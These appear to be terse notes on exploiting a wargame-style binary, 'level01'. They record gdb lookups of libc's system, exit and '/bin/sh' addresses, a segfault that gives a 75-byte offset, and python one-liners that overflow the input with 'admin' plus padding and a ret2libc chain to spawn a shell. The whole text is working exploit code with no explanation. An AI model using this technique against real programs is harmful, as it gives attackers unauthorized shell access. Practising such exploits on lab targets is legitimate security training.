p system
0x f7 e6 ae d0 --> \xd0\xae\xe6\xf7 

p exit
0x f7 e5 eb 70 --> \x70\xeb\xe5\xf7


find 0xf7e2c000, 0xf7ffe000, '/', 'b', 'i', 'n', '/', 's', 'h'
0x f7 f8 97 ec --> \xec\x97\xf8\xf7

Program received signal SIGSEGV, Segmentation fault.`
0x41356341

Offset 75

r < <(python -c 'print "dat_wil"' ; python -c 'print "admin" + "A"*75 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xed\x97\xf8\xf7"')

(python -c 'print "dat_wil"' ; python -c 'print "admin" + "A"*75 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' ; cat) | ./level01

